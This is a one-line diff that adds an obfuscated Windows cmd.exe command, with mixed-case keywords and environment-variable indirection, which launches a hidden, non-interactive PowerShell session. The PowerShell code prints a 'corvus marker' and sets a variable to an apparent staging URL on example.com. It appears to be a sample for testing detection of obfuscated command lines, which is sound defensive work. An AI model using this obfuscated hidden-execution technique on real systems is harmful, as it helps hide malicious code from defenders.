@@ -1,0 +1,1 @@
+﻿C:\WINdOWs\SYsTem32\CMD.Exe   /c   "seT   TKvb=  Write-Host 'corvus marker'; $u = 'http://example.com/corvus/stage.txt'  &&SET   AHf=eCHO iEx (GeT-chIlDITEm env:tKvB).VALUe ^|  POWerSHeLL  -wiNDOwStYLe  HiDDen -NoP  -NOnINTeRacT    (ChILditeM 'VariAbLE:eXecutiOncONTEXt').VALUe.InVokEcOmmaNd.InVokescRiPt($INPUT) && C:\WINdOWs\SYsTem32\CMD.Exe   /c%AhF%"
